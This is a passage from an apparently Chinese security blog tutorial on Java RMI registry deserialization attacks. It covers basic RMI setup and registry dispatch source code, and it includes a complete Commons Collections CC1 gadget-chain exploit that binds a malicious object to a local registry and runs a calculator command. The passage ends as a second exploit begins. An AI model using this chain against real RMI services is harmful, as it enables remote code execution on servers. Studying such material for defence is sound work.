class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">rmi</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RemoteClass</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造方法"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"hello,world"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello,world"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个实现类需要</p><ul><li>实现远程接口</li><li>继承UnicastRemoteObject类，貌似继承了之后会使用默认socket进行通讯，并且该实现类会一直运行在服务器上（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法）</li><li>构造函数需要抛出一个RemoteException错误</li><li>实现类中使用的对象必须都可序列化，即都继承java.io.Serializable</li></ul><p>注册远程对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        rmi hello = <span class="keyword">new</span> RemoteClass();<span class="comment">//创建远程对象</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//创建注册表</span></span><br><span class="line">        registry.rebind(<span class="string">"hello"</span>,hello);<span class="comment">//将远程对象注册到注册表里面，并且设置值为hello</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于绑定的地址很多地方会rmi://ip:port/Objectname的形式，实际上看rebind源码就知道RMI:写不写都行，port如果默认是1099，不写会自动补上，其他端口必须写<br>那么服务端就部署好了，来看客户端</p><p>2.客户端部署</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">1099</span>);<span class="comment">//获取远程主机对象</span></span><br><span class="line">        <span class="comment">// 利用注册表的代理去查询远程注册表中名为hello的对象</span></span><br><span class="line">        RemoteClass hello = (RemoteClass) registry.lookup(<span class="string">"hello"</span>);</span><br><span class="line">        <span class="comment">// 调用远程方法</span></span><br><span class="line">        System.out.println(hello.hello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么先运行服务端，再运行客户端，就可以完成调用   </p><p>攻击方式详情可看此文章：<a href="https://paper.seebug.org/1251/#java-rmi-" target="_blank" rel="noopener">https://paper.seebug.org/1251/#java-rmi-</a>  </p><h1 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h1><p><a href="https://www.anquanke.com/post/id/197829" target="_blank" rel="noopener">浅谈Java RMI Registry安全问题</a>   </p><p>我们与注册中心进行交互可以使用如下几种方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">list</span><br><span class="line"><span class="built_in">bind</span></span><br><span class="line">rebind</span><br><span class="line">unbind</span><br><span class="line">lookup</span><br><span class="line">``` </span><br><span class="line">这几种方法位于RegistryImpl_Skel<span class="comment">#dispatch中，如果存在readObject，则可以利用   </span></span><br><span class="line">dispatch里面对应关系如下</span><br></pre></td></tr></table></figure><p>0-&gt;bind<br>1-&gt;list<br>2-&gt;lookup<br>3-&gt;rebind<br>4-&gt;unbind</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">list</span><br><span class="line">&#96;&#96;&#96;java</span><br><span class="line"> case 1:</span><br><span class="line">                var2.releaseInputStream();</span><br><span class="line">                String[] var79 &#x3D; var6.list();</span><br><span class="line"></span><br><span class="line">                try &#123;</span><br><span class="line">                    ObjectOutput var81 &#x3D; var2.getResultStream(true);</span><br><span class="line">                    var81.writeObject(var79);</span><br><span class="line">                    break;</span><br><span class="line">                &#125; catch (IOException var75) &#123;</span><br><span class="line">                    throw new MarshalException(&quot;error marshalling return&quot;, var75);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>这里没有readObject所以无法利用</p><h2 id="bind-amp-rebind"><a href="#bind-amp-rebind" class="headerlink" title="bind&amp;rebind"></a>bind&amp;rebind</h2><p>JDK版本在8u141之后， 这里会先去判断是否为本地绑定请求，然后再进行反序列化。   </p><p>所以如果要使用bind/rebind请求来远程攻击Registry，JDK版本必须在8u141之前   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                RegistryImpl.checkAccess(<span class="string">"Registry.bind"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var9 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var9.readObject();</span><br><span class="line">                    var80 = (Remote)var9.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException var77) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var77);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.bind(var7, var80);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="keyword">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var76) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"error marshalling return"</span>, var76);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                RegistryImpl.checkAccess(<span class="string">"Registry.rebind"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var9 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var9.readObject();</span><br><span class="line">                    var80 = (Remote)var9.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException var70) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var70);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.rebind(var7, var80);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="keyword">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var69) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"error marshalling return"</span>, var69);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>当调用bind时，会用readObject读出参数名以及远程对象，此时则可以利用</p><p>当调用rebind时，会用readObject读出参数名和远程对象，这里和bind是一样的，所以都可以利用</p><p>如果服务端存在cc1相关组件漏洞，那么就可以使用反序列化攻击  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        new Class[] &#123; String.class &#125;, new Object[]&#123;"open  /System/Applications/Calculator.app"&#125;)&#125;);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>);</span><br><span class="line">        Constructor[] constructors = clazz.getDeclaredConstructors();</span><br><span class="line">        Constructor constructor = constructors[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Map map = (Map)constructor.newInstance(innermap,chain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">map</span>)</span>; <span class="comment">//创建第一个代理的handler</span></span><br><span class="line"></span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map<span class="class">.<span class="keyword">class</span>&#125;,<span class="title">map_handler</span>)</span>; <span class="comment">//创建proxy对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor AnnotationInvocationHandler_Constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">proxy_map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>,<span class="number">8888</span>);</span><br><span class="line">        Remote r = Remote<span class="class">.<span class="keyword">class</span>.<span class="title">cast</span>(<span class="title">Proxy</span>.<span class="title">newProxyInstance</span>(</span></span><br><span class="line"><span class="class">                <span class="title">Remote</span>.<span class="title">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">                new Class[] &#123; Remote.class &#125;, handler));</span><br><span class="line">        registry.bind(<span class="string">"test"</span>,r);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用的是cc1的链，所以服务端自然也需要存在cc1相关的漏洞组件才行。</p><p>重点关注：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Remote r = Remote<span class="class">.<span class="keyword">class</span>.<span class="title">cast</span>(<span class="title">Proxy</span>.<span class="title">newProxyInstance</span>(</span></span><br><span class="line"><span class="class">        <span class="title">Remote</span>.<span class="title">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">        new Class[] &#123; Remote.class &#125;, handler));</span><br></pre></td></tr></table></figure><p>Remote.class.cast这里实际上是将一个代理对象转换为了Remote对象：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Proxy.newProxyInstance(</span><br><span class="line">                Remote<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">                new Class[] &#123; Remote.class &#125;, handler)</span><br></pre></td></tr></table></figure><p>上述代码中创建了一个代理对象，这个代理对象代理了Remote.class接口，handler为我们的handler对象。当调用这个代理对象的一切方法时，最终都会转到调用handler的invoke方法。</p><p>而handler是InvocationHandler对象，所以这里在反序列化时会调用InvocationHandler对象的invoke方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">    <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                Object var6 = <span class="keyword">this</span>.memberValues.get(var4);</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>在invoke方法里，同样会触发memberValues的get方法，此时的memberValues是proxy_map，其也是一个代理类对象，所以会继续触发proxy_map的invoke方法，后边的就是cc1的前半段内容了  </p><h2 id="unbind-amp-lookup"><a href="#unbind-amp-lookup" class="headerlink" title="unbind &amp; lookup"></a>unbind &amp; lookup</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                RegistryImpl.checkAccess(<span class="string">"Registry.unbind"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var8 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var8.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException var67) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var67);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.unbind(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="keyword">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var66) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"error marshalling return"</span>, var66);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var8 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var8.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException var73) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var73);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var80 = var6.lookup(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    ObjectOutput var82 = var2.getResultStream(<span class="keyword">true</span>);</span><br><span class="line">                    var82.writeObject(var80);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var72) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"error marshalling return"</span>, var72);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>从上述代码中我们可以发现，unbind和lookup实际上都会调用readObject来读取传递过来的参数，所以同样是可以利用的。</p><p>不过这里有一个问题，当我们调用unbind或者lookup时，只允许我们传递字符串，所以没法传递我们的恶意对象。</p><p>这个问题要解决有几种办法：</p><ul><li>伪造连接请求</li><li>rasp hook请求代码，修改发送数据</li></ul><p>我用的是第一种，也是比较简单的一种，直接通过反射就能实现。</p><p>想要手动伪造请求，我们就需要去判断一下当执行lookup时，会经过怎样的流程。</p><p>在调用lookup之前，我们需要先获取客户端，通过getRegistry方法返回的是一个Registry_Stub对象。</p><p>RegistryImpl_Stub#lookup</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Remote <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        RemoteCall var2 = <span class="keyword">this</span>.ref.newCall(<span class="keyword">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line">            var3.writeObject(var1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var17) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">"error marshalling arguments"</span>, var17);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">        Remote var22;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInput var4 = var2.getInputStream();</span><br><span class="line">            var22 = (Remote)var4.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var14) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling return"</span>, var14);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var15) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling return"</span>, var15);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.ref.done(var2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var22;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var18) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var18;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var19) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var19;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NotBoundException var20) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var20;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var21) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnexpectedException(<span class="string">"undeclared checked exception"</span>, var21);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> 